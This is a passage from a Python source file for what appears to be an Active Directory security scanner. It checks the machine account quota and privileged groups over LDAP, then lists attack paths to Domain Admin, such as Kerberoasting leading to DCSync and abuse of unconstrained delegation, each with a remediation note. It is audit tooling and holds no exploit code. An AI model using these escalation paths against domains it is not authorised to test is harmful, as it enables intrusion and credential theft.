        noPac-style attacks. (NTLM-relay exposure itself is now determined
        properly from SMB signing in the pre-auth SMB assessment, not from an
        LDAP heuristic.)"""
        logger.info("Checking machine account quota (RBCD prerequisite)...")
        if not self._conn:
            return []

        findings: list[ADFinding] = []
        try:
            self._conn.search(
                self.domain_dn, "(objectClass=domain)",
                attributes=["ms-DS-MachineAccountQuota"],
            )
            if self._conn.entries:
                raw = getattr(self._conn.entries[0], "ms-DS-MachineAccountQuota", None)
                try:
                    maq = int(str(raw.value)) if raw is not None and raw.value is not None else -1
                except (TypeError, ValueError):
                    maq = -1
                if maq > 0:
                    findings.append(ADFinding(
                        target=self.domain,
                        attack_type=ADAttackType.MACHINE_ACCOUNT_QUOTA,
                        severity="medium",
                        title=f"Machine Account Quota = {maq} (any user can join computers)",
                        description=(
                            f"ms-DS-MachineAccountQuota is {maq}, so any authenticated "
                            "user can create up to that many computer accounts. This is "
                            "the prerequisite for resource-based constrained delegation "
                            "(RBCD) abuse and noPac privilege-escalation chains."
                        ),
                        confidence=0.9,
                        remediation=(
                            "Set ms-DS-MachineAccountQuota to 0 and delegate computer "
                            "joins to a dedicated group instead."
                        ),
                        mitre_technique="T1078",
                        evidence={"machine_account_quota": maq},
                    ))
        except Exception as e:
            logger.debug(f"Machine account quota check: {e}")

        self._findings.extend(findings)
        return findings

    async def check_acl_abuse(self) -> list[ADFinding]:
        """Check for misconfigured ACLs that allow privilege escalation."""
        logger.info("Checking for ACL abuse paths...")
        if not self._conn:
            return []

        findings = []

        # Check for users with write access to privileged groups
        try:
            self._conn.search(
                self.domain_dn,
                "(&(objectClass=group)(adminCount=1))",
                search_scope=SUBTREE,
                attributes=["cn", "member", "nTSecurityDescriptor"],
            )
            priv_groups = [str(e.cn) for e in self._conn.entries]

            if priv_groups:
                findings.append(ADFinding(
                    target=self.domain,
                    attack_type=ADAttackType.ACL_ABUSE,
                    severity="medium",
                    title=f"ACL Audit: {len(priv_groups)} privileged groups identified",
                    description=(
                        f"Identified {len(priv_groups)} groups with adminCount=1. "
                        "Recommend auditing ACLs for GenericAll, WriteDacl, WriteOwner permissions "
                        "that could allow unauthorized privilege escalation."
                    ),
                    affected_objects=priv_groups[:15],
                    confidence=0.70,
                    remediation="Audit ACLs with BloodHound or PowerView. Remove unnecessary permissions.",
                    mitre_technique="T1222.001",
                ))
        except Exception as e:
            logger.error(f"ACL check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def build_attack_paths(self) -> list[dict]:
        """Build BloodHound-style attack paths from any user to Domain Admin."""
        logger.info("Building attack path graph...")
        paths = []

        # Build graph edges from findings
        for finding in self._findings:
            if finding.attack_type == ADAttackType.KERBEROASTING:
                for obj in finding.affected_objects:
                    self._graph["Kerberoast"].add(obj)
                    self._graph[obj].add("Service Account Credentials")
                    self._graph["Service Account Credentials"].add("Lateral Movement")
            elif finding.attack_type == ADAttackType.UNCONSTRAINED_DELEG:
                for obj in finding.affected_objects:
                    self._graph["Compromise Any User"].add(f"TGT on {obj}")
                    self._graph[f"TGT on {obj}"].add("Domain Admin Impersonation")
            elif finding.attack_type == ADAttackType.DCSYNC_RISK:
                self._graph["Privileged Account Compromise"].add("DCSync")
                self._graph["DCSync"].add("All Domain Hashes")
                self._graph["All Domain Hashes"].add("Domain Admin")

        # Find shortest paths to Domain Admin
        if self._graph:
            path_example = {
                "name": "Kerberoast → Lateral Movement → Domain Admin",
                "steps": [
                    {"step": 1, "action": "Kerberoast service account", "technique": "T1558.003"},
                    {"step": 2, "action": "Crack TGS ticket offline", "technique": "T1110.002"},
                    {"step": 3, "action": "Authenticate as service account", "technique": "T1078"},
                    {"step": 4, "action": "Lateral movement to DC", "technique": "T1021.002"},
                    {"step": 5, "action": "DCSync all hashes", "technique": "T1003.006"},
                ],
                "complexity": "medium",
                "detection_difficulty": "hard",
                "total_steps": 5,
            }
            paths.append(path_example)

            if self._domain_info.unconstrained_deleg:
                paths.append({
                    "name": "Unconstrained Delegation → Domain Admin",
                    "steps": [
                        {"step": 1, "action": "Coerce authentication to delegation host", "technique": "T1187"},
                        {"step": 2, "action": "Capture TGT from memory", "technique": "T1558"},
                        {"step": 3, "action": "Impersonate Domain Admin", "technique": "T1550"},
                    ],
                    "complexity": "low",
                    "detection_difficulty": "medium",
                    "total_steps": 3,
                })

        if paths:
            self._findings.append(ADFinding(
                target=self.domain,
                attack_type=ADAttackType.ACL_ABUSE,
                severity="critical",
                title=f"Attack Path Analysis: {len(paths)} paths to Domain Admin",
                description=f"Discovered {len(paths)} attack paths from unprivileged user to Domain Admin.",
                attack_path=[str(p.get("name", "")) for p in paths],
                confidence=0.85,
                remediation="Implement tiered administration. Protect Tier 0 assets.",
                mitre_technique="T1078",
                evidence={"paths": paths},
            ))

        return paths

    def _offline_summary(self) -> dict:
        """Summary when no authenticated LDAP bind was obtained. The pre-auth
        network layer (RootDSE + SMB) may already have produced real findings, so
        we keep them; only note the missing authenticated depth when nothing at
        all was found."""
        if not self._findings:
            logger.warning("AD scan: no authenticated access and no pre-auth signal")
            self._findings.append(ADFinding(
                target=self.domain or self.dc_host,
                attack_type=ADAttackType.DOMAIN_INFO,
                severity="info",
                title="AD Scan: No Authenticated Directory Access",
                description=(
                    "Could not obtain an authenticated LDAP bind and the pre-auth "
                    "SMB/LDAP layer returned no signal. Provide domain credentials "
                    "(--ad-user/--ad-pass) for full Kerberoasting/AS-REP/DCSync/"
                    "delegation/ACL analysis."
                ),
                confidence=0.0,
                remediation="Supply domain credentials to enable authenticated AD assessment.",
            ))
        else:
            logger.info(
                f"AD scan: pre-auth layer produced {len(self._findings)} finding(s) "
                "(no authenticated bind — supply creds for full depth)"
            )
        return self.summary()

    def summary(self) -> dict:
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self._findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        return {
            "domain": self.domain,
            "dc_host": self.dc_host,
            "domain_info": {
                "domain": self._domain_info.domain,
                "forest": self._domain_info.forest,
                "dc_hostname": self._domain_info.dc_hostname,
                "functional_level": self._domain_info.functional_level,
                "users": self._domain_info.total_users,
                "computers": self._domain_info.total_computers,
                "groups": self._domain_info.total_groups,
                "password_policy": self._domain_info.password_policy,
            },
            "total_findings": len(self._findings),
            "severity_breakdown": severity_counts,
            "findings": [f.to_dict() for f in self._findings],
            "attack_paths": len([f for f in self._findings if f.attack_path]),
            "kerberoastable_accounts": len(self._domain_info.spn_accounts),
            "asrep_accounts": len(self._domain_info.asrep_accounts),
        }


async def scan_active_directory(domain: str = "", dc_host: str = "",
                                 username: str = "", password: str = "",
                                 **kwargs) -> dict:
    """Entry point for AD scanning from the orchestrator.

    A Domain Controller IP alone is enough to run a real assessment: the domain
    name is auto-derived from the DC's RootDSE and the pre-auth SMB layer
    (signing/relay, SMBv1, null session) runs without credentials. Only when
    there is neither a DC host nor a domain is the scan skipped.
    """
    if not domain:
        domain = kwargs.get("ad_domain", "")
    if not dc_host:
        dc_host = kwargs.get("ad_dc", "") or kwargs.get("dc_ip", "")
    # A DC host is sufficient on its own — the domain is discovered from RootDSE.
    if not dc_host:
        if domain:
            dc_host = domain  # try resolving the domain name as the DC endpoint
        else:
            logger.info("No AD domain/DC specified — skipping AD scan")
            return {"skipped": True, "reason": "No AD domain or DC host configured"}

    scanner = ADScanner(domain, dc_host, username, password)
    return await scanner.full_scan()
